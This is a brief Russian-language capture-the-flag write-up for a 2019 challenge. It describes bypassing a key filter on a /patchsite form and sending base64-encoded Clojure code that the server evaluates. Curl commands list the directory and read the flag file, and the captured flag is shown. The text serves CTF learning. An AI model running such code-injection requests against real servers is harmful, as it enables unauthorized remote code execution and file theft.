1. Мы посмотрели в исходники по которым понятно что есть форма /patchsite которая принимает 2 параметра, key и command
- длинна key >10 <15 
- последовательность ert удаляется
- пробелы в начале и конце удаляются 
- после итоговой обработки должен ыть равен qwerty
key берем например "      qweertrty"
- command это base64 от clojure кода который обрезан по =, и эвалюейтится (соответственно добиваем пробелами код, что бы не было пидинга)
2. Курим как в clojure работать с fs 

- (seq (.list (clojure.java.io/file ".") ) ) - листинг текущей директории
- (slurp "filname") вывод фаила

$ curl -XPOST http://filter.ctf2019.rocks/patchsite -d'key=      qweertrty&command=KHNlcSAoLmxpc3QgKGNsb2p1cmUuamF2YS5pby9maWxlICIuIikgKSAp'
targetflagsrcproject.clj

$ curl -H "Host: filter.ctf2019.rocks" http://92.223.25.115/patchsite -d'key=      qweertrty&command=KHNsdXJwICJmbGFnIiAp' (slurp "flag")
  WGCTF{83679AB7B512F757C5B86F3908D1579E}

./src/filter/flag.clj - второй доп

3. secret-view генерит доп флаг, по кондишенам получаем строку abababababababab от которой надо взять md5 хеш
